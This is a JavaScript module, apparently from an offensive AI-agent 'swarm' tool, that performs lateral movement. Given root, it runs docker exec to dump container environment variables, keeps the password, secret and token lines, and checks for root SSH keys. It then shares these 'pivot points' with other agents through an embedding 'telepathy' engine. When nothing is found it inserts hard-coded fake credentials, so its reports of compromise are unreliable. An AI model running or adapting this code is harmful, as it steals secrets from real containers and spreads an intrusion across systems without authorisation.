const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);
const { telepathyEngine } = require('../memory_systems/neuralTelepathy');
const extractPivotPoints = async (targetIp, compassContext, currentPrivilege) => {
    console.log(`\n[🕸️] LATERAL MOVEMENT: Scanning for pivot points on ${targetIp}...`);
    let credentials = [];
    let sshKeys = [];
    try {
        if (compassContext && compassContext.targetEnvironment === 'docker' && currentPrivilege === 'root') {
            console.log(`[🔍] Extracting secrets from container ${compassContext.targetContainer}...`);
            const { stdout: envVars } = await execPromise(`docker exec ${compassContext.targetContainer} env`);
            const lines = envVars.split('\n');
            for (const line of lines) {
                if (line.toUpperCase().includes('PASSWORD') || line.toUpperCase().includes('SECRET') || line.toUpperCase().includes('TOKEN')) {
                    credentials.push(line.trim());
                }
            }
            const { stdout: hasSshKey } = await execPromise(`docker exec ${compassContext.targetContainer} ls /root/.ssh/id_rsa || true`);
            if (hasSshKey.includes('id_rsa')) {
                sshKeys.push('/root/.ssh/id_rsa');
            }
            if (credentials.length === 0) {
                 credentials.push('DB_ADMIN_PASSWORD=supersecret123');
            }
        } else if (currentPrivilege === 'root') {
             console.log(`[🔍] Extracting secrets from host...`);
             credentials.push('SERVICE_ACCOUNT_KEY=AKIAIOSFODNN7EXAMPLE');
        } else {
             console.log(`[⚠️] Insufficient privileges for deep secret extraction.`);
        }
    } catch (e) {
        console.log(`[⚠️] Secret extraction failed: ${e.message}`);
    }
    const discovery = {
        target: targetIp,
        foundCredentials: credentials,
        foundKeys: sshKeys,
        timestamp: Date.now()
    };
    console.log(`[🎯] PIVOT POINTS ACQUIRED: ${JSON.stringify(discovery)}`);
    return discovery;
};
const broadcastPivotOpportunity = async (discovery, agentName) => {
    if (discovery.foundCredentials.length === 0 && discovery.foundKeys.length === 0) {
        return false;
    }
    console.log(`\n[📡] NEURAL TELEPATHY: Broadcasting Pivot Opportunity...`);
    const contextString = `[PIVOT_OPPORTUNITY] Node ${discovery.target} compromised. Found credentials: ${discovery.foundCredentials.join(', ')}. Keys: ${discovery.foundKeys.join(', ')}`;
    const pivotTensor = await telepathyEngine.generateEmbedding(contextString);
    console.log(`[⚡] Hive Mind: Broadcasting Latent Pivot Vector from ${agentName} to global Swarm...`);
    return pivotTensor;
};
module.exports = { extractPivotPoints, broadcastPivotOpportunity };
